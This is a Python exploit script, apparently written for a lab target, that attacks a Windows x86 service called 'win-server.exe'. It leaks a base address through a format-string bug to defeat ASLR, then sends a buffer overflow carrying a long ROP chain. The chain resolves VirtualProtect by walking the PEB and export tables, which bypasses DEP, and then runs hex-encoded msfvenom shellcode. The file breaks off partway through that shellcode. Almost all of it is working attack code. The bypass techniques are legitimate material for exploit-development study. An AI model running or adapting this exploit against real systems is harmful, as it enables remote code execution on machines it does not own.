#!/usr/bin/env python3
from __future__ import annotations
from argparse import (
    ArgumentParser as Parser,
    Namespace
)
from typing import (
    TypeVar,
    Union,
    Generic,
    Annotated,
    final,
    IO
)
from socket import (
    socket,
    AF_INET,
    SOCK_STREAM
)
from struct import (
    pack,
    unpack
)
from sys import (
    stdout,
    stderr,
    argv,
    exit
)
from abc import abstractmethod
from binascii import unhexlify


""" Generic type definitions """

# Generic exception type for error handling and presentation
_E = TypeVar("_E", bound=Union[str, bytes, Exception, None])
# Generic type for generation of ROP payloads
_A = TypeVar("_A", bound=Union[list, str, None])
# Generic byte-string type used for data manipulation
_B = TypeVar("_B", bound=Union[str, bytes, None])
# Generic socket type that allows None as a value
_S = TypeVar("_S", bound=Union[socket, None])
# Generic type that can be anything
_T = TypeVar("_T")


""" Abstract Template class used as the Exploit base """


class Template(Generic[_T, _B, _E, _S, _A]):
    """ Description:

        (i) An abstract base-class as the Template which implements common exploit methods

        A. Concrete implementations include:
            1. Basic helper methods for data manipulation
            2. Presentation methods for display purposes
            3. Socket methods for TCP connectivity
            4. Basic exploit methods for generating payloads

        B. Abstract methods include:
            1. Generation of exploit specific ROP payloads
            2. Execution of exploit specific business logic
            3. Main static method for instantiation purposes
    """
    def __init__(
        self,
        address: str = "172.31.24.111",
        port: int = 65534,
        bufferSize: int = 4,
        verbose: bool = False,
        throw: bool = False,
        base: int = 0x00000000,
        shellcode: str = "",
        **kw
    ) -> Annotated[None, """
        Base abstract Template class that implements common exploit methods
    """]:
        """ Constructor
        :param address: IP address of remote target
        :param port: TCP port of remote target
        :param bufferSize: Default size for socket buffering
        :param verbose: Enable debugging
        :param throw: Raise exceptions
        :param base: Default base-address value
        :param shellcode: Default shellcode payload
        :param kw: Additional key-pair arguments
        """
        # Create default TCP socket
        self.sock: socket = socket(AF_INET, SOCK_STREAM)
        # Convert hex-encoded shellcode to bytes
        self.shellcode: bytes = (
            shellcode if isinstance(shellcode, bytes)
            else unhexlify(shellcode)
        )
        # Default size for socket buffering
        self.bufferSize: int = bufferSize
        # Default ROP gadget lookup table
        self.gadgets: dict = dict()
        # Default PE base address
        self.base: int = base
        # Address and TCP port of target
        self.address: str = address
        self.port: int = port
        # Debugging settings
        self.verbose: bool = verbose
        self.throw: bool = throw
        # Update the instance attributes
        self.__dict__.update(**kw)

    """ Helper methods """

    @staticmethod
    def toString(value: _B) -> Annotated[str, """
        Casts bytes to a string or returns a string value
    """]:
        """ Cast to string
        :param value: A string or bytes value
        :return: Value as a string
        """
        return (
            value.decode()
            if isinstance(value, bytes)
            else str(value)
        )

    @staticmethod
    def toBytes(value: _B) -> Annotated[bytes, """
        Casts a string to bytes or returns a bytes value
    """]:
        """ Cast to bytes
        :param value: A bytes or string value
        :return: Value as bytes
        """
        return (
            value.encode()
            if isinstance(value, str)
            else value
        )

    @staticmethod
    def padding(size: int, byte: int = 0x90) -> Annotated[bytes, """
        Creates a byte-array of padding for a given size and byte
    """]:
        """ Create byte-padding
        :param size: Size of bytes to create
        :param byte: Byte to fill padding
        :return: Bytes array
        """
        return bytes([byte]) * size

    def unsigned(self: Template, data: _B) -> Annotated[int, """
        Converts a DWORD byte-array to a unsigned-long address 
    """]:
        """ Cast to unsigned-long (DWORD)
        :param data: Byte or string value
        :return: Unsigned-long integer
        """
        return self.unpack(
            unhexlify(
                self.toString(data).strip().ljust(8, "0")
            )
        )

    @staticmethod
    def pack(address: int) -> Annotated[bytes, """
        Converts a unsigned-long address to a little-endian byte-array
    """]:
        """ Convert unsigned-long to bytes
        :param address: Unsigned-long integer of DWORD address
        :return: Bytes in little-endian format
        """
        return pack("<L", address)

    @staticmethod
    def unpack(address: bytes) -> Annotated[int, """
        Converts a byte-array to a big-endian unsigned-long address    
    """]:
        """ Convert bytes to unsigned-long
        :param address: Little-endian bytes of DWORD address
        :return: Unsigned-long integer
        """
        return unpack(">L", address)[0]

    """ Presentation methods """

    def display(self: Template, value: _B, fd: IO = stdout) -> Annotated[Template, """
        Default method to write a value to stdout 
    """]:
        """ Write value to stdout or stderr
        :param value: String or bytes value to display
        :param fd: File descriptor to write with
        :return: Instance for fluent patterns
        """
        fd.write(f"{self.toString(value).strip()}\n")
        return self

    def error(self: Template, value: _E) -> Annotated[Template, """
        Displays an error and throws exceptions when throw is enabled    
    """]:
        """ Write error to stderr or raise exception
        :param value: String, bytes, or Exception value
        :return: Instance for fluent patterns
        """
        # If verbose is enabled, display error message via stderr
        if self.verbose:
            self.display(f"[!] ERROR: {value}", stderr)
        # Raise error is value is an Exception and enabled
        if issubclass(type(value), Exception):
            if self.throw:
                raise value
        return self

    def debug(self: Template, value: _B) -> Annotated[Template, """
        Displays debug messages when verbose is enabled    
    """]:
        """ Write debug value to stdout if verbose is enabled
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        # Display debug message is verbose is enabled
        return (
            self.display(f"[*] DEBUG: {value}")
            if self.verbose else self
        )

    def success(self: Template, value: _B) -> Annotated[Template, """
        Displays success messages     
    """]:
        """ Write success value to stdout
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        return self.display(f"[+] SUCCESS: {value}")

    def failure(self: Template, value: _B) -> Annotated[Template, """
        Displays failure messages using bold-red terminal characters    
    """]:
        """ Write failure value to stdout
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        return self.display(f"[!] FAILURE: {value}")

    def info(self: Template, value: _B) -> Annotated[Template, """
        Displays informational messages using green terminal characters    
    """]:
        """ Write informational value to stdout
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        return self.display(f"[i] INFO: {value}")

    """ Socket methods """

    def connect(self: Template) -> Annotated[Template, """
        Connects to the given address and port via TCP
    """]:
        """ Connect TCP socket to remote IP address on a given port
        :return: Instance for fluent patterns
        """
        self.info(f"Connecting to: {self.address}:{self.port}")
        try:
            # Close any existing connection
            if bool(self.sock):
                self.debug(f"Already connected, closing existing connection")
                self.close()
            # Create a new socket and TCP connection to the remote target
            self.sock: _S = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.address, self.port))
            self.success(f"Connected to: {self.address}:{self.port}")
        except Exception as err:
            # Close the socket and handle error upon connection failure
            self.close()
            self.error(Exception(f"Connect error: {err}"))
        return self

    def send(self: Template, value: _B) -> Annotated[Template, """
        Sends bytes to the connected socket
    """]:
        """ Send value to remote connection over TCP socket
        :param value: String or bytes value to send
        :return: Instance for fluent patterns
        """
        try:
            # Throw exception of socket isn't connected
            if not bool(self.sock):
                raise Exception(f"Socket not connected")
            # Send value as bytes through socket
            self.sock.send(self.toBytes(value))
        except Exception as err:
            # Close the socket and handle error upon transmission failure
            self.close()
            self.error(Exception(f"Send error: {err}"))
        return self

    def receive(self: Template, *ag, **kw) -> Annotated[bytes, """
        Receives bytes of a given size from the socket 
    """]:
        """ Receive bytes from connected socket
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair arguments
        :return: Bytes received
        """
        buffer: _B = bytes()
        try:
            # Throw exception of socket isn't connected
            if not bool(self.sock):
                raise Exception(f"Socket not connected")
            # Retrieve bytes from socket
            buffer: _B = self.sock.recv(*ag, **kw)
        except Exception as err:
            # Close the socket and handle error upon transmission failure
            self.close()
            self.error(Exception(f"Receive error: {err}"))
        return buffer

    def until(self: Template, value: _B) -> Annotated[bytes, """
        Receives bytes from the socket until a pattern is matched 
    """]:
        """ Receive bytes until value is matched
        :param value: String or bytes value to match
        :return: Bytes received
        """
        (buffer, value) = (bytes(), self.toBytes(value))
        try:
            while True:
                try:
                    buffer += self.receive(self.bufferSize)
                    if value in buffer:
                        break
                except Exception as er:
                    self.error(f"Receive until error: {er}")
                    break
        except Exception as err:
            # Close the socket and handle error upon transmission failure
            self.close()
            self.error(Exception(f"Receive until error: {err}"))
        return buffer

    def close(self: Template) -> Annotated[Template, """
        Closes the connections socket
    """]:
        """ Close TCP connection and set socket to null
        :return: Instance for fluent patterns
        """
        try:
            # Check if socket exists
            if bool(self.sock):
                # Close socket and set the property to null
                self.info(f"Disconnecting from: {self.address}:{self.port}")
                self.sock.close()
                self.sock: _S = None
        except Exception as err:
            # Expected error if already closed
            self.debug(f"Close error: {err}")
        return self

    """ Exploit methods """

    def gadget(self: Template, key: str, *ag, **kw) -> Annotated[int, """
        Looks up a ROP gadget's unsigned-long base-address given the assembly key
    """]:
        """ Retrieve a ROP gadgets address
        :param key: String assembly instruction as lookup key
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair collection of arguments
        :return: Unsigned-long integer of gadget's address
        """
        return self.gadgets.get(key, *ag, **kw)

    def chain(self: Template, values: _A) -> Annotated[bytes, """
        Converts ROP chain instructions to bytes  
    """]:
        """ Generate bytes of a ROP chain
        :param values: Single instruction or collection of instructions
        :return: Bytes of ROP gadget chain
        """
        # ROP chain bytes to return
        result: bytes = bytes()
        try:
            # Ensure value is a array
            values: list = values if isinstance(values, list) else [values]
            # Iterate collection of values
            for value in values:
                # If value is bytes, append it to the ROP chain
                if isinstance(value, bytes):
                    result += value
                # If value is a string, lookup the gadget and append it
                if isinstance(value, str):
                    result += self.pack(self.gadget(value))
                # If the value is an integer, pack the unsigned-long value
                if isinstance(value, int):
                    result += self.pack(value)
        except Exception as err:
            # Handle unexpected error upon failure
            self.error(Exception(f"Chain error: {err}"))
        return result

    def update(self: Template) -> Annotated[Template, """
        Updates the table of ROP gadgets with leaked base
    """]:
        """ Update the addresses in the ROP lookup table
        :return: Instance for fluent patterns
        """
        self.info(f"Updating gadget table with leaked offset")
        try:
            # Iterate through copy of lookup table items
            for (gadget, value) in self.gadgets.copy().items():
                # Add leaked base-address to ROP offset
                self.gadgets[gadget] = self.base + value
            self.success(f"Gadget table updated")
        except Exception as err:
            # Handle unexpected error upon failure
            self.error(Exception(f"Update error: {err}"))
        return self

    """ Abstract exploit methods """

    @abstractmethod
    def rop(self: Template) -> Annotated[bytes, """
        Logic used to create the ROP chain
    """]:
        """ Abstract method to generate ROP payload
        :return: Bytes of ROP payload
        """
        ...

    @abstractmethod
    def execute(self: Template) -> Annotated[Template, """
        Logic used to execute the entire attack
    """]:
        """ Abstract method for exploit business logic
        :return: Instance for fluent patterns
        """
        ...

    @staticmethod
    @abstractmethod
    def main(*ag, **kw) -> Annotated[None, """
        Main static entry method to instantiate the instance
    """]:
        """ Main static method for instantiation
        :param ag: Optional packed array of arguments
        :param kw: Optional packed array of key-pair arguments
        :return: None
        """
        ...


""" Concrete exploit class implements attributes specific to the exploit """


# noinspection PyAttributeOutsideInit
class Exploit(Template[_T, _B, _E, _S, _A]):
    """ Description:

        (i) Concrete Exploit class that implements the Template base class
        (i) Specific to exploitation of vulnerable debug command and format-string

        A. Polymorphic methods include:
            1. Final method to override errors by closing the connection

        B. Concrete implementations of abstract methods include:
            1. Obtaining the win-server.exe base-address via format-string vulnerability
            2. Creation of position-independent ROP to call VirtualProtect() and execute shellcode
            3. Execution of business logic to exploit the memory leak and buffer overflow
            4. Main static method to parse arguments and instantiate the exploit
    """
    def __init__(
        self,
        command: _B = b"debug",
        crash: int = 719,
        *ag, **kw
    ) -> Annotated[None, """
        Concrete implementation of the abstract with exploit specific attributes 
    """]:
        """ Constructor
        :param command: Vulnerable command used to trigger buffer overflow
        :param crash: Offset to trigger crash for EIP control
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair arguments
        """
        # Call parent class constructor
        Template.__init__(self, *ag, **kw)
        # Set vulnerable command as bytes
        self.command: bytes = self.toBytes(command)
        # Set crash offset
        self.crash: int = crash
        # Concrete ROP lookup table for win-server.exe
        self.gadgets: dict = {
            # Conditional logic gadgets (if-then)
            "cmp eax, dword ptr [ebp + 0x28]": 0x00001898,
            "cmove edi, esi": 0x00001871,
            "cmp eax, ecx": 0x000018b0,
            # Write primitive gadgets (write-what-where)
            "mov dword ptr [ebp + 0x10], eax": 0x00001911,
            "mov dword ptr [ebp + 0x14], eax": 0x00001919,
            "mov dword ptr [ebp + 0x18], eax": 0x0000191d,
            "mov dword ptr [ebp + 0x1c], eax": 0x00001925,
            "mov dword ptr [ebp + 0x20], eax": 0x00001929,
            "mov dword ptr [ebp + 0x24], eax": 0x00001931,
            "mov dword ptr [ebp + 0x28], eax": 0x00001935,
            "mov dword ptr [ebp + ecx], eax": 0x00001952,
            "mov dword ptr [ebp + 0xc], eax": 0x00001941,
            "mov dword ptr [ebp + 4], eax": 0x00001945,
            "mov dword ptr [ebp + 8], eax": 0x00001949,
            "mov ax, word ptr [ecx]": 0x000018d7,
            # Read primitive gadgets (read-what-where)
            "mov eax, dword ptr [eax + ecx*4]": 0x000019c1,
            "mov ecx, dword ptr [ecx + eax*4]": 0x00001a88,
            "mov eax, dword ptr [eax + 0x14]": 0x000019b1,
            "mov eax, dword ptr [eax + 0x1c]": 0x000019b5,
            "mov eax, dword ptr [eax + 0x78]": 0x000019b9,
            "mov eax, dword ptr [eax + ebx]": 0x000019bd,
            "mov eax, dword ptr [ebp + 0x10]": 0x000019d8,
            "mov eax, dword ptr [ebp + 0x14]": 0x000019dc,
            "mov eax, dword ptr [ebp + 0x18]": 0x000019e0,
            "mov eax, dword ptr [ebp + 0x1c]": 0x000019e4,
            "mov eax, dword ptr [ebp + 0x20]": 0x000019e8,
            "mov eax, dword ptr [ebp + 0x24]": 0x000019ec,
            "mov eax, dword ptr [ecx + 0x3c]": 0x00001a09,
            "mov eax, dword ptr [ebp + 0xc]": 0x000019f4,
            "mov eax, dword ptr [ebp + 8]": 0x000019fc,
            "mov eax, dword ptr fs:[0x30]": 0x00001a51,
            "mov eax, dword ptr [ecx]": 0x000018d8,
            "mov eax, dword ptr [eax]": 0x000019d5,
            # Encoding gadgets for null bytes
            "xor eax, 0xffffffff": 0x00001bcc,
            "xor eax, eax": 0x00001bd0,
            "xor edi, edi": 0x00001bc9,
            # Stack pivot gadgets for ESP and EBP
            "add esp, 0x3c": 0x0000253e,
            "xchg ebp, ecx": 0x00001ba5,
            "mov eax, ebp": 0x00001a5c,
            "mov eax, esp": 0x00001a6e,
            "mov ecx, esp": 0x00001a8c,
            "mov esp, eax": 0x00001a92,
            "mov esp, edi": 0x00001a9b,
            "ret": 0x000019cf,
            # Addition gadgets
            "add eax, 0x10": 0x0000178a,
            "add eax, 0x20": 0x0000179e,
            "add eax, 0x24": 0x000017a2,
            "add eax, 0x3c": 0x000017a6,
            "add ecx, 0x10": 0x000017df,
            "add ecx, 0x14": 0x000017e3,
            "add ecx, 0x24": 0x000017f3,
            "add ecx, 0x28": 0x000017f7,
            "add eax, ebx": 0x000017b6,
            "add eax, esi": 0x000017bc,
            "add ebx, 0xc": 0x000017d3,
            "add ecx, eax": 0x00001807,
            "add edi, eax": 0x00001810,
            "add eax, 1": 0x0000179a,
            "add eax, 4": 0x000017aa,
            "add eax, 8": 0x000017b2,
            "add ebx, 8": 0x000017db,
            "add ecx, 4": 0x000017ff,
            # Subtraction gadgets
            "sub eax, 1": 0x00001b44,
            "sub ebx, 4": 0x00001b52,
            # Exchange EAX gadgets
            "xchg eax, ebx": 0x00001b9d,
            "xchg eax, ecx": 0x00001b9f,
            "xchg eax, edx": 0x00001ba1,
            "xchg eax, esi": 0x00001bb4,
            # Exchange EDX and ESI gadgets
            "xchg edx, ecx": 0x00001bb1,
            "xchg esi, edi": 0x00001bb9,
            # General purpose EAX gadgets
            "mov eax, ebx": 0x00001a5f,
            "mov eax, esi": 0x00001a6b,
            "mov ecx, eax": 0x000018f7,
            "pop eax": 0x00001aae,
            # Clear directional flag gadget (conditional)
            "cld": 0x00001317,
            # Debugging gadget for breakpoints
            "int 3": 0x000018c4,
        }

    """ Polymorphic method override for error handling """

    @final
    def error(self: Exploit, value: _E) -> Annotated[Exploit, """
        Displays an error and throws exceptions when throw is enabled    
    """]:
        """ Handle exception and close connection
        :param value: String, bytes, or Exception
        :return: Instance for fluent patterns
        """
        # Close connection if throw is enabled
        if self.throw:
            self.close()
        # Call parent method with value
        return Template.error(self, value)

    """ Concrete exploit implementations """

    @final
    def leak(self: Exploit) -> Annotated[Exploit, """
        Logic used to trigger a memory-leak to leak the base address
    """]:
        """ Concrete implementation of memory-leak via format-string
        :return: Instance for fluent patterns
        """
        self.info(f"Leaking assembly base-address from the stack")
        try:
            # Receive initial bytes until prompt
            _ = self.until(">")
            # Send format-string to leak the base-address in hex-format
            self.send(".%x.%x.FLAG")
            # Receive bytes until flag is read
            leaked: _B = self.until("FLAG")
            # Raise exception if leaked value isn't bytes
            if not isinstance(leaked, bytes):
                raise Exception(f"Invalid leaked value")
            self.debug(f"Leaked value: {leaked}")

            # Convert leaked bytes to unsigned-long value of base-address
            self.base: int = self.unsigned(leaked.split(b".")[2][:4])
            self.success(f"Leaked base address: {hex(self.base)}")
        except Exception as err:
            # Close connection and handle error upon failure
            self.error(Exception(f"Error leaking base address: {err}"))
        return self

    @final
    def rop(self: Exploit) -> Annotated[bytes, """
        Logic used to create the ROP chain
    """]:
        """ Create the ROP payload to call VirtualProtect() and run shellcode after leaking the base:

            1. Gain control of EIP
                * Trigger the overflow in the vulnerable debug command
                * Create a new stack frame and save the address
                * Stack pivot over the variable region

            2. Obtain address to VirtualProtect()

                TEB->PEB->LDR->InMemoryOrderLoadList->win_server->ntdll->kernel32

                * Create variables with placeholder values
                * Find the kernel32 base address from the LDR
                * Find the export table
                * Find the name table
                * Find the ordinal table
                * Find the address table
                * Set the number of exported functions
                * Loop through functions to find VirtualProtect

            3. Setup VirtualProtect() API call

                BOOL WINAPI VirtualProtect(      =>    Pointer to kernel32!VirtualProtect()
                    _In_   LPVOID lpAddress,     =>    Address for new protect value
                    _In_   SIZE_T dwSize,        =>    Size of shellcode in bytes
                    _In_   DWORD flNewProtect,   =>    Memory protect value of RWX (0x40)
                    _Out_  PDWORD lpflOldProtect =>    Writable address for API call output
                )

                * Set the address to VirtualProtect
                * Set the address to the shellcode on the stack
                * Set the size of memory that includes the shellcode
                * Set the protect value to RWX
                * Set the output address to a writable location on the stack

            4. Call VirtualProtect() and execute shellcode
                * Stack pivot to execute the VirtualProtect() API call
                * Padding to null-free shellcode
                * Padding after shellcode for size consistency
        """
        self.info(f"Creating ROP chain to call VirtualProtect() and execute shellcode")
        # Default return value
        buffer: _B = bytes()
        try:
            # Buffer of ROP bytes generated
            buffer: bytes = self.chain([
            # 1. Gain control of EIP
                # Trigger execution via vulnerable command "debug" followed by 719 bytes
                self.command,
                self.padding(self.crash, 0xcc),

                # Padding of NOP-ROPs to gain control of EIP
                "ret",
                "ret",
                "ret",
                "ret",

                # New stack frame, save base pointer, and pivot past variables
                "mov ecx, esp",
                "xchg ebp, ecx",
                "add esp, 0x3c",

            # 2. Obtain address to VirtualProtect()
                # Variables
                0xffffffff,  # Variable 1: Address of kernel32 base
                0xffffff11,  # Variable 2: Address of export-table
                0xffffff22,  # Variable 3: Number of exported functions
                0xffffff33,  # Variable 4: Address of exported-functions table
                0xffffff44,  # Variable 5: Address of name-pointer table
                0xffffff55,  # Variable 6: Address of functions-ordinal table
                0xffffff66,  # Variable 7: Count of exported functions
                0xffffff77,  # Variable 8: Address of check failed logic
                0xffffff88,  # Variable 9: First 4-bytes of function name
                0xffffff99,  # Variable 10: Second 4-bytes of function name
                0xffffff10,  # Variable 11: Extra variable

                # VirtualProtect string with additional "te"
                b"VirtualProtetect",

                # Obtain the kernel32 base-address from the LDR:
                "ret",
                "xor eax, eax",
                "xchg eax, ebx",
                "xor eax, eax",
                "add ebx, 0xc",
                # Pointer to PEB
                "mov eax, dword ptr fs:[0x30]",
                # Pointer to LDR
                "mov eax, dword ptr [eax + ebx]",
                "add ebx, 8",
                # Pointer to InMemoryOrderModuleList
                "mov eax, dword ptr [eax + ebx]",
                # Current module (win-serve.exe)
                "mov eax, dword ptr [eax]",
                # Entry for ntdll
                "mov eax, dword ptr [eax]",
                "sub ebx, 4",
                # Save kernel32 base to EAX
                "mov eax, dword ptr [eax + ebx]",
                "mov dword ptr [ebp + 4], eax",

                # Obtain address of PE signature
                "xchg eax, ebx",
                "mov eax, ebx",
                "mov ecx, eax",
                "mov eax, dword ptr [ecx + 0x3c]",
                "add eax, ebx",

                # Address of export table
                "mov eax, dword ptr [eax + 0x78]",
                "add eax, ebx",
                "mov dword ptr [ebp + 8], eax",

                # Number of exported functions
                "mov eax, dword ptr [eax + 0x14]",
                "mov dword ptr [ebp + 0xc], eax",

                # Address of exported functions table
                "mov eax, dword ptr [ebp + 8]",
                "mov eax, dword ptr [eax + 0x1c]",
                "add eax, ebx",
                "mov dword ptr [ebp + 0x10], eax",

                # Address of name pointer table
                "mov eax, dword ptr [ebp + 8]",
                "add eax, 0x20",
                "mov eax, dword ptr [eax]",
                "add eax, ebx",
                "mov dword ptr [ebp + 0x14], eax",

                # Address of functions ordinal table
                "mov eax, dword ptr [ebp + 8]",
                "add eax, 0x24",
                "mov eax, dword ptr [eax]",
                "add eax, ebx",
                "mov dword ptr [ebp + 0x18], eax",

                # Loop counter
                "ret",
                "xor eax, eax",
                "mov dword ptr [ebp + 0x1c], eax",

                # Loop fail address
                "mov eax, esp",
                "add eax, 0x10",
                "mov dword ptr [ebp + 0x20], eax",

                # Loop count check
                "ret",
                "ret",
                "ret",
                "ret",
                "mov eax, ebp",
                "add eax, 0x24",
                "add eax, 4",
                "xchg eax, esi",
                "xor edi, edi",
                "mov eax, esp",
                "add eax, 0x24",
                "add edi, eax",
                "mov eax, dword ptr [ebp + 0xc]",
                "xchg eax, ecx",
                "mov eax, dword ptr [ebp + 0x1c]",
                "cmp eax, ecx",
                "cmove edi, esi",
                "mov esp, edi",

                # Begin loop to check the name of exported functions
                "ret",
                "ret",
                "ret",
                "xchg eax, esi",
                "mov eax, dword ptr [ebp + 0x1c]",
                "xchg eax, ecx",
                "mov eax, dword ptr [ebp + 0x14]",
                "cld",
                "mov eax, dword ptr [eax + ecx*4]",
                "add eax, ebx",
                "mov dword ptr [ebp + 0x24], eax",
                "xchg eax, ecx",
                "add eax, 1",
                "mov dword ptr [ebp + 0x1c], eax",

                # Set "Virt" check conditions
                "ret",
                "mov eax, dword ptr [ebp + 0x24]",
                "mov eax, dword ptr [eax]",
                "mov dword ptr [ebp + 0x28], eax",
                "mov eax, esp",
                "add eax, 0x3c",
                "xor edi, edi",
                "add edi, eax",
                "mov eax, dword ptr [ebp + 0x20]",
                "xchg eax, esi",
                "xchg esi, edi",

                # Perform "Virt" check
                "mov eax, ebp",
                "xchg eax, ecx",
                "add ecx, 0x24",
                "add ecx, 0x10",
                "mov eax, dword ptr [ecx]",
                "cmp eax, dword ptr [ebp + 0x28]",
                "cmove edi, esi",
                "mov esp, edi",

                # Set "ualP" check conditions
                "ret",
                "ret",
                "ret",
                "xchg esi, edi",
                "xchg eax, esi",
                "mov eax, dword ptr [ebp + 0x24]",
                "add eax, 4",
                "mov eax, dword ptr [eax]",
                "mov dword ptr [ebp + 0x28], eax",
                "mov eax, esp",
                "add eax, 0x3c",
                "xor edi, edi",
                "add edi, eax",
                "mov eax, dword ptr [ebp + 0x20]",
                "xchg eax, esi",
                "xchg esi, edi",

                # Perform "ualP" check
                "mov eax, ebp",
                "xchg eax, ecx",
                "add ecx, 0x28",
                "add ecx, 0x10",
                "mov eax, dword ptr [ecx]",
                "cmp eax, dword ptr [ebp + 0x28]",
                "cmove edi, esi",
                "mov esp, edi",

                # Set "rote" check conditions
                "ret",
                "ret",
                "ret",
                "xchg esi, edi",
                "xchg eax, esi",
                "mov eax, dword ptr [ebp + 0x24]",
                "add eax, 8",
                "mov eax, dword ptr [eax]",
                "mov dword ptr [ebp + 0x28], eax",
                "mov eax, esp",
                "add eax, 0x3c",
                "xor edi, edi",
                "add edi, eax",
                "mov eax, dword ptr [ebp + 0x20]",
                "xchg eax, esi",
                "xchg esi, edi",

                # Perform "rote" check
                "mov eax, ebp",
                "xchg eax, ecx",
                "add ecx, 0x28",
                "add ecx, 0x14",
                "mov eax, dword ptr [ecx]",
                "cmp eax, dword ptr [ebp + 0x28]",
                "cmove edi, esi",
                "mov esp, edi",

                # Set "tect" conditions
                "ret",
                "ret",
                "ret",
                "xchg esi, edi",
                "xchg eax, esi",
                "mov eax, dword ptr [ebp + 0x24]",
                "add eax, 8",
                "add eax, 1",
                "add eax, 1",
                "mov eax, dword ptr [eax]",
                "mov dword ptr [ebp + 0x28], eax",
                "mov eax, esp",
                "add eax, 0x3c",
                "xor edi, edi",
                "add edi, eax",
                "mov eax, dword ptr [ebp + 0x20]",
                "xchg eax, esi",
                "xchg esi, edi",

                # Perform "tect" check
                "mov eax, ebp",
                "xchg eax, ecx",
                "add ecx, 0x28",
                "add ecx, 0x14",
                "add ecx, 4",
                "mov eax, dword ptr [ecx]",
                "cmp eax, dword ptr [ebp + 0x28]",
                "cmove edi, esi",
                "mov esp, edi",

                # Obtain exported address from ordinal table
                "ret",
                "ret",
                "ret",
                "xchg esi, edi",
                "xchg eax, esi",
                "mov eax, dword ptr [ebp + 0x1c]",
                "sub eax, 1",
                "mov dword ptr [ebp + 0x1c], eax",
                "mov eax, dword ptr [ebp + 0x18]",
                "xchg eax, ecx",
                "mov eax, dword ptr [ebp + 0x10]",
                "xchg eax, edx",

            # 3. Setup VirtualProtect() API call
                # Address of VirtualProtect
                "ret",
                "mov eax, dword ptr [ebp + 0x1c]",
                "xchg eax, esi",
                "mov eax, esi",
                "add eax, esi",
                "add ecx, eax",
                "cld",
                "mov ax, word ptr [ecx]",
                "xchg edx, ecx",
                "mov ecx, dword ptr [ecx + eax*4]",
                "xchg eax, ecx",
                "add eax, ebx",
                "mov dword ptr [ebp + 8], eax",

                # dwSize
                "ret",
                "pop eax",
                int(0xffffffff ^ 0x600),
                "xor eax, 0xffffffff",
                "mov dword ptr [ebp + 0x14], eax",

                # flNewProtect
                "pop eax",
                int(0xffffffff ^ 0x40),
                "xor eax, 0xffffffff",
                "mov dword ptr [ebp + 0x18], eax",

                # retAddress
                "mov eax, esp",
                "add eax, 0x3c",
                "mov dword ptr [ebp + 0xc], eax",

                # lpAddress
                "mov eax, ebp",
                "mov dword ptr [ebp + 0x10], eax",

                # lpflOldProtect
                "mov eax, ebp",
                "add eax, 0x10",
                "add eax, 0x24",
                "mov dword ptr [ebp + 0x1c], eax",

            # 4. Call VirtualProtect() and execute shellcode
                # Call VirtualProtect()
                "mov eax, ebp",
                "add eax, 8",
                "mov esp, eax",
                "ret",

                # Padding and shellcode
                (self.pack(0x90909090) * 10),
                self.shellcode,
                (self.pack(0xcccccccc) * 27)
            ])
            # Set index to beginning of buffer
            self.success(f"ROP chain generated successfully")
        except Exception as err:
            # Close connection and handle exception upon failure
            self.error(Exception(f"Failed to create ROP chain: {err}"))
        return buffer

    @final
    def execute(self: Exploit) -> Annotated[Template, """
        Logic used to execute the entire attack
    """]:
        """ Concrete implementation of exploit's main business logic
        :return: Instance for fluent patterns
        """
        try:
            # Connect to remote target
            self.connect()
            # Leak PE base-address to calculate ROP
            self.leak()
            # Update the gadget lookup table's addresses
            self.update()
            # Generate ROP payload and send it to the target
            self.info(f"Sending payload to target")
            self.send(self.rop())
            self.success(f"Payload sent to target")
            # Close any existing connection after exploitation
            self.close()
        except Exception as err:
            # Close connection and handle exception upon failure
            self.error(f"Exception running exploit: {err}")
        return self

    @staticmethod
    @final
    def main(*ag, **kw) -> Annotated[None, """
        Main static entry method to instantiate the instance
    """]:
        """ Concrete implementation of main method to parse arguments and instantiate exploit
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair collection of arguments
        :return: None
        """
        # Argument parser that contains constructor parameters
        parser: Parser = Parser(
            description="Buffer overflow exploit for Windows x86 'win-server.exe' (DEP & ASLR bypass)",
            usage=f""" {argv[0]} -a 172.31.24.111 -p 65534 -c "debug" -o 719 -s "$HEX_SHELLCODE" """,
            add_help=True
        )
        try:
            # Address argument, default set for local debugging
            parser.add_argument(
                "--address", "-a",
                dest="address",
                type=str,
                default="172.31.24.111",
                action="store",
                help="Remote IP address (default: 172.31.24.111)"
            )
            # Port argument, default set for local debugging
            parser.add_argument(
                "--port", "-p",
                dest="port",
                type=int,
                default=65534,
                action="store",
                help="Remote port (default: 65534)"
            )
            # Verbosity argument, false by default
            parser.add_argument(
                "--verbose", "-v",
                dest="verbose",
                default=False,
                action="store_true",
                help="Enable verbose output (default: false)"
            )
            # Raise exception argument, false by default
            parser.add_argument(
                "--throw", "-t",
                dest="throw",
                default=False,
                action="store_true",
                help="Raise exceptions (default: false)"
            )
            # Buffer size argument, default DWORD size
            parser.add_argument(
                "--buffer", "-b",
                dest="bufferSize",
                type=int,
                default=4,
                action="store",
                help="Socket buffer size (default: 4-bytes)"
            )
            # Vulnerable command argument, default "debug"
            parser.add_argument(
                "--command", "-c",
                dest="command",
                type=str,
                default="debug",
                action="store",
                help="Vulnerable command (default: debug)"
            )
            # Crash offset argument, default 719
            parser.add_argument(
                "--offset", "-o",
                dest="crash",
                type=int,
                default=719,
                action="store",
                help="Offset to overflow EIP (default: 719)"
            )
            # Shellcode argument in hex-string, default set to execute "calc"
            parser.add_argument(
                "--shellcode", "-s",
                dest="shellcode",
                type=str,
                action="store",
                help="Hex-encoded x86 shellcode to execute (default: execute calc.exe)",
                default=(
                    # Default x86: msfvenom -p windows/exec cmd='calc' -b "\x00\x0a\x0d"
                    "bac18eb4e5daded97424f458"
                    "33c9b13083c00431500f0350"
                    "ce6c411938f2aae2b8932307"
                    "89935043b923120135cf76b2"
                    "cebd5eb5670bb9f87820f99b"
                    "fa3b2e7cc3f3237d04e9ce2f"
                    "dd657cc06a33bd6b20d5c588"
                    "f0d4e41e8b8e26a058bb6eba"
                    "bd863931757cb893447d17da"
                    "698c691a4d6f1c52ae1227a1"
                    "cdc8a232759a159f844fc354"
                    "8a2487338ebb4448aa306b9f"
